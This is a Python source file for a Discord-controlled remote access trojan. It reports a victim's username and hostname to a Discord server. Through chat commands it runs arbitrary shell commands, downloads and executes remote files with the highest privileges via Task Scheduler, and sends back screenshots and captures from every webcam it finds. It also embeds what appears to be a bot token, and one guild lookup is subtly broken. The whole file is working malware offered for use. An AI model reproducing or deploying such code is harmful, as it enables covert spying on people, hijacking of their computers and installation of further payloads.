import discord
from discord.ext import commands
import subprocess
import os
import zipfile
import platform
import socket
import pyautogui
import cv2
import shutil
import urllib.request
from datetime import datetime

# Bot setup
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True

bot = commands.Bot(command_prefix='.', intents=intents)

# Get username and computer name
username = os.getlogin()
computer_name = socket.gethostname()

# Global variable to hold the cmd process
cmd_process = None


# Utility function to create a zip of a folder
def zip_folder(folder_path):
    zip_filename = folder_path + '.zip'
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
    return zip_filename


# Create category and channels on bot startup
@bot.event
async def on_ready():
    guild = bot.guilds[1327070421907931179]  # Replace with specific guild if needed

    # Create category
    category_name = f"{username} - {computer_name}"
    existing_category = discord.utils.get(guild.categories, name=category_name)

    if existing_category is None:
        category = await guild.create_category(category_name)
    else:
        category = existing_category

    # Create channels within category
    cmd_channel = discord.utils.get(guild.text_channels, name="cmd", category=category)
    if cmd_channel is None:
        cmd_channel = await category.create_text_channel("cmd")

    commands_channel = discord.utils.get(guild.text_channels, name="commands", category=category)
    if commands_channel is None:
        commands_channel = await category.create_text_channel("commands")

    # Send a message to the "commands" channel when the bot is ready
    await commands_channel.send(f"{username}'s computer {computer_name} is now online.")


# CMD Execution command (only works in "cmd" channel)
@bot.command()
async def exec(ctx, *, command):
    category_name = f"{username} - {computer_name}"
    if ctx.channel.name == 'cmd' and ctx.channel.category.name == category_name:
        global cmd_process
        if cmd_process is None:
            cmd_process = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, text=True, shell=True)

        cmd_process.stdin.write(command + "\n")
        cmd_process.stdin.flush()

        output = cmd_process.stdout.readline().strip()
        await ctx.send(f"```{output}```")


# Download command (only works in "commands" channel)
@bot.command()
async def download(ctx, url: str, filename: str):
    category_name = f"{username} - {computer_name}"
    if ctx.channel.name == 'commands' and ctx.channel.category.name == category_name:
        try:
            # Download the file
            urllib.request.urlretrieve(url, filename)
            await ctx.send(f"Downloaded `{filename}` successfully.")

            # Schedule the downloaded file to run with Task Scheduler
            await schedule_task(ctx, filename)
        except Exception as e:
            await ctx.send(f"Failed to download file: {str(e)}")


# Run file using Task Scheduler with admin privileges (only works in "commands" channel)
@bot.command()
async def runfile(ctx, *, filepath):
    category_name = f"{username} - {computer_name}"
    if ctx.channel.name == 'commands' and ctx.channel.category.name == category_name:
        if os.path.exists(filepath):
            await schedule_task(ctx, filepath)
        else:
            await ctx.send(f"File `{filepath}` does not exist.")


# Schedule the task to run the file as an admin using Task Scheduler
async def schedule_task(ctx, filepath):
    try:
        task_name = f"{computer_name}_task_{os.path.basename(filepath)}"
        command = f"schtasks /create /tn \"{task_name}\" /tr \"{filepath}\" /sc once /rl highest /st 00:00 /f"
        subprocess.run(command, shell=True)

        # Start the task immediately
        start_task_cmd = f"schtasks /run /tn \"{task_name}\""
        subprocess.run(start_task_cmd, shell=True)

        await ctx.send(f"Scheduled and started `{filepath}` successfully using Task Scheduler.")
    except Exception as e:
        await ctx.send(f"Failed to schedule or run the task: {str(e)}")


# Screenshot command (only works in "commands" channel)
@bot.command()
async def ss(ctx):
    category_name = f"{username} - {computer_name}"
    if ctx.channel.name == 'commands' and ctx.channel.category.name == category_name:
        screenshot_path = f"{computer_name}_screenshot.png"
        pyautogui.screenshot(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)  # Cleanup screenshot after sending


# Webcam command (only works in "commands" channel)
@bot.command()
async def webcam(ctx):
    category_name = f"{username} - {computer_name}"
    if ctx.channel.name == 'commands' and ctx.channel.category.name == category_name:
        cam_index = 0
        camera_found = False

        while True:
            cap = cv2.VideoCapture(cam_index)
            if cap is None or not cap.isOpened():
                break

            camera_found = True
            ret, frame = cap.read()
            if ret:
                cam_filename = f"{computer_name}_cam_{cam_index}.png"
                cv2.imwrite(cam_filename, frame)
                await ctx.send(file=discord.File(cam_filename))
                os.remove(cam_filename)  # Cleanup after sending
            cam_index += 1
            cap.release()

        if not camera_found:
            await ctx.send("No camera found on this computer.")


# Log computer online message
@bot.event
async def on_connect():
    guild = bot.guilds[0]
    category_name = f"{username} - {computer_name}"
    category = discord.utils.get(guild.categories, name=category_name)
    commands_channel = discord.utils.get(category.text_channels, name="commands")
    await commands_channel.send(f"{username}'s computer {computer_name} is now online.")


bot.run("MTMzNzIzNTgwNjYxMTQ0Mzc2NA.GLoqxm.NipW5FjYVZ2KwD8T1drZawsnNYdt5HjrJTVfuY")
